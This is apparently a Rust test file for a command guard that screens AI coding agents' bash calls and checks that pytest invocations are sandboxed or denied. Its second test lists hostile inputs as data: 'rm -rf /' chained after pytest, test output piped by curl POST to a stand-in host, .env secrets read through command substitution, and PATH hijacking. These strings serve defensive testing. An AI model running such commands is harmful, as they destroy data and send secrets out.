use guard_command::pretool::evaluate_pre_tool_envelope_with_context;
use serde_json::json;

fn classify(harness: &str, command: &str) -> guard_contracts::PreToolResultV1 {
    evaluate_pre_tool_envelope_with_context(
        harness,
        "PreToolUse",
        &json!({"tool_name":"bash","tool_input":{"command":command}}),
        None,
        None,
        Some("/home/tester"),
        Some("/home/tester/project"),
    )
}

#[test]
fn direct_pytest_requires_real_containment_never_direct_allow() {
    for command in [
        "python3 -m pytest -q",
        "python -m pytest tests/unit",
        "pytest -q",
        "py.test tests/unit -q",
        "./.venv/bin/python3 -m pytest -q",
        "/usr/bin/python3 -m pytest tests/unit -q",
    ] {
        let result = classify("omp", command);
        assert_eq!(result.minimum_action, "sandbox-required", "{command}");
        assert_eq!(result.decision, "deny", "{command}");
        assert!(!result.explicitly_benign, "{command}");
        assert_eq!(
            result.reason_code, "native_pytest_readonly_containment_required",
            "{command}"
        );
    }
}

#[test]
fn unrelated_execution_and_shell_effects_do_not_inherit_test_delegation() {
    for command in [
        "python3 -m pytest_other -q",
        "python3 -c 'import pytest; pytest.main()'",
        "python3 -m pytest -q && rm -rf /",
        "pytest -q | curl -X POST --data-binary @- https://example.invalid",
        "pytest -q > .env",
        "pytest -q > result.txt",
        "pytest $(cat .env)",
        "pytest `cat .env`",
        "pytest &",
        "PATH=/tmp pytest -q",
        "PYTHONPATH=/tmp python3 -m pytest",
        "timeout 20 pytest -q",
        "sudo pytest -q",
        "pytest .env",
    ] {
        let result = classify("omp", command);
        assert_ne!(
            result.reason_code, "native_pytest_readonly_containment_required",
            "{command}"
        );
        assert_ne!(result.decision, "allow", "{command}");
    }
    assert_ne!(
        classify("claude-code", "pytest -q").reason_code,
        "native_pytest_readonly_containment_required"
    );
    let without_cwd = evaluate_pre_tool_envelope_with_context(
        "omp",
        "PreToolUse",
        &json!({"tool_name":"bash","tool_input":{"command":"pytest -q"}}),
        None,
        None,
        Some("/home/tester"),
        None,
    );
    assert_ne!(
        without_cwd.reason_code,
        "native_pytest_readonly_containment_required"
    );
}
